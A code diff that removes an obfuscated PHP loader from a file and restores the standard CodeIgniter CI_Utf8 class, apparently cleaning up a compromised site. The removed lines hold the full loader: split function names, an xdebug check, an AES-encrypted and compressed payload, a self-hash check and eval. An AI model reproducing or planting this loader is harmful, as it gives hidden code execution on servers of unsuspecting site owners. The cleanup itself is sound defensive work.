@@ -1,28 +1,151 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_vpzsi2q9=('bas'.'e64'.'_de'.'cod'.'e');
-$_y8eceppq=('gzu'.'nco'.'mpr'.'ess');
-$_ux0erfbd=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_y0eisucw='+E+8wfJNCAA=';
-$_h294dgqj='3iZIqSqO';
-$_tampibne='xQ1U4u3C';
-$_dm5fsbt1='+ns8sHlf';
-$_kiwjq688='NLhux0ub';
-$_viodvl83='QcqT3Xko';
-$_xadvu6f4='BbG8UEst';
-$_h9o7b5j8='XY9CUw==';
-$_pzji4zvh=$_vpzsi2q9($_h294dgqj.$_tampibne.$_dm5fsbt1.$_kiwjq688.$_y0eisucw);
-$_pjrv81yn=$_vpzsi2q9($_xadvu6f4.$_viodvl83.$_h9o7b5j8);
-$_ej8jp3l4=$_vpzsi2q9('d53tcoWP+GYBmz3Aymr4uirTrKF70W2JAvfH7SBIqkMM4i5/YGqTaY4aBQkHxVv9U5UleGiMWpSucFIpkqFhrYiaFx9kEVN/5bLTwFK+abmHrzb6hiYptlOEovEQfmz3uKqb6tNFS+cbdkwPAa20cRQuWRrugW0Nbe0vWJnZAWkzgMaq2eHyE/GaVJp5yVDOB0keP+z4hrsXsUIVc5q2batCeETZgV0RJ/hvw8NWvGvzp4yeMbWxtaF0VsFl+nca445ygSnWL6k2E9vkpqP3PxIjZE83vwzpqPvhi+A4ZVLrzuGCtc/GQcuhQliKEJOQm3Fw+PJgD1+9BZCtni2iB56sIZi5cHlFTzI+KoGlObbg2Zs2VCM2c69GM/xaOlmjyi3+/+A5gt7FHpb5eboFp+blKtiQCC+fFKS2eCUlTowtJi0wMaUNilIOmdsnidy8XP5Ej+jbpj9xrBaRkbubTQWGNJsdHIol6jwhE6L6nISm1qkm7dySNVOI6zcbOveauqakXvSbshy9p4kWkdUKxPvNiZQmarxUo4RpA/JRpy4RjfljNk6XL94ueprkcBaFuHh7FqngI1Yoj7KN/Y48htY3QUP7+ILL7hROVRuKJJi/G5cu9BX+7qUEduyOWNjJYHGwz0p2aSUiUje0sKr5M3ZCtp/0sbnIuxgu/uxoKxndFXlfP07fUOSy/gQpmcx0');
-$_zd89u06f=$_ux0erfbd($_ej8jp3l4,'aes-256-cbc',$_pzji4zvh,OPENSSL_RAW_DATA,$_pjrv81yn);
-if($_zd89u06f===false){exit;}
-$_gu7w33z5=$_y8eceppq($_zd89u06f);
-if($_gu7w33z5===false){exit;}
-$_mldfgdwp='4016f89d6dbb6ae59d2324a916168853956a9703a3be5cb481218b0e9fe27c34';
-$_zgwmoyx0=@file_get_contents(__FILE__);
-if($_zgwmoyx0!==false){
-$_qhn86wp0=str_replace($_mldfgdwp,"0000000000000000000000000000000000000000000000000000000000000000",$_zgwmoyx0);
-$_efmbpyid=hash("sha256",$_qhn86wp0);
-if($_efmbpyid!==$_mldfgdwp){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_Utf8 {
+
+
+
+
+
+
+
+public function __construct()
+{
+if (
+defined('PREG_BAD_UTF8_ERROR') 
+&& (ICONV_ENABLED === TRUE OR MB_ENABLED === TRUE) 
+&& strtoupper(config_item('charset')) === 'UTF-8' 
+)
+{
+define('UTF8_ENABLED', TRUE);
+log_message('debug', 'UTF-8 Support Enabled');
 }
-eval($_gu7w33z5);
+else
+{
+define('UTF8_ENABLED', FALSE);
+log_message('debug', 'UTF-8 Support Disabled');
+}
+log_message('info', 'Utf8 Class Initialized');
+}
+
+
+
+
+
+
+
+
+
+public function clean_string($str)
+{
+if ($this->is_ascii($str) === FALSE)
+{
+if (MB_ENABLED)
+{
+$str = mb_convert_encoding($str, 'UTF-8', 'UTF-8');
+}
+elseif (ICONV_ENABLED)
+{
+$str = @iconv('UTF-8', 'UTF-8//IGNORE', $str);
+}
+}
+return $str;
+}
+
+
+
+
+
+
+
+
+
+
+
+public function safe_ascii_for_xml($str)
+{
+return remove_invisible_characters($str, FALSE);
+}
+
+
+
+
+
+
+
+
+
+
+public function convert_to_utf8($str, $encoding)
+{
+if (MB_ENABLED)
+{
+return mb_convert_encoding($str, 'UTF-8', $encoding);
+}
+elseif (ICONV_ENABLED)
+{
+return @iconv($encoding, 'UTF-8', $str);
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+
+
+public function is_ascii($str)
+{
+return (preg_match('/[^\x00-\x7F]/S', $str) === 0);
+}
+}
